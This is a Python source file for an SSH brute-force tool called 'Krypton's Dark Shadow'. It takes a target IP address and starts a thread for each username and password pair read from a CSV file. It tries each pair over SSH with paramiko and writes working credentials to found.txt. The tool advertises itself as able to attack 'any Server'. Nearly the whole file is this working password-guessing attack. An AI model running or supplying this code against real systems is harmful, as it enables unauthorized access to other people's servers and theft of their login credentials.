import csv
import ipaddress
import threading
import time
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from colorama import Fore
import os
import socket

def menu():
    men = input('>>>')
    if men == '1':
        manual()
    if men == '2':
        print(Fore.BLUE + "Bye...;)")
        exit()
    else:
        menu()



def logo():
    print(Fore.RED + """
 _  __                 _                    ____             _        
| |/ /_ __ _   _ _ __ | |_ ___  _ __  ___  |  _ \  __ _ _ __| | __          
| ' /| '__| | | | '_ \| __/ _ \| '_ \/ __| | | | |/ _` | '__| |/ /
| . \| |  | |_| | |_) | || (_) | | | \__ \ | |_| | (_| | |  |   < 
|_|\_\_|   \__, | .__/ \__\___/|_| |_|___/ |____/ \__,_|_|  |_|\_\ 
___________|___/|_|________________________________________________                                               
 ____  _               _               
/ ___|| |__   __ _  __| | _____      __
\___ \| '_ \ / _` |/ _` |/ _ \ \ /\ / /
 ___) | | | | (_| | (_| | (_) \ V  V /   -Developed by Krypton-
|____/|_| |_|\__,_|\__,_|\___/ \_/\_/
_______________________________________""" + Fore.RESET)

def ssh_connect(host, username, password):
    ssh_client = SSHClient()
   
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
       
        ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
        
        with open("found.txt", "a") as fh:
            
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n ")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print(Fore.RED + "+ [ERROR] --> Attempting to connect - Rate limiting on server" + Fore.RESET)


def get_ip_address():
    
    while True:
        host = input('Please enter the host ip address: ')
        try:
           
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            
            print(Fore.RED + "+ [ERROR] --> Please enter a valid ip address." + Fore.RESET)
            
        


def manual():
    print()
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
   
    list_file="passwords.csv"
    host = get_ip_address()
    
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
       
        for index, row in enumerate(csv_reader):
           
            if index == 0:
                continue
            else:
               
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))
                
                t.start()
                
                time.sleep(0.2)



if __name__ == '__main__':
    # check for os type to clear past output
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')




def __main__():
    print()
logo()
print()
print()
print(Fore.BLUE + "+ [INFO] --> Welcome to Krypton's Dark Shadow" + Fore.RESET)
print(Fore.BLUE + "+ [INFO] --> This is a tool that can executes an SSH attack on any Server!" + Fore.RESET)
print()
print(Fore.MAGENTA + "+ [INPUT] --> 1.Start the Tool")
print(Fore.MAGENTA + "+ [INPUT] --> 2.exit" + Fore.RESET)
print()
menu()

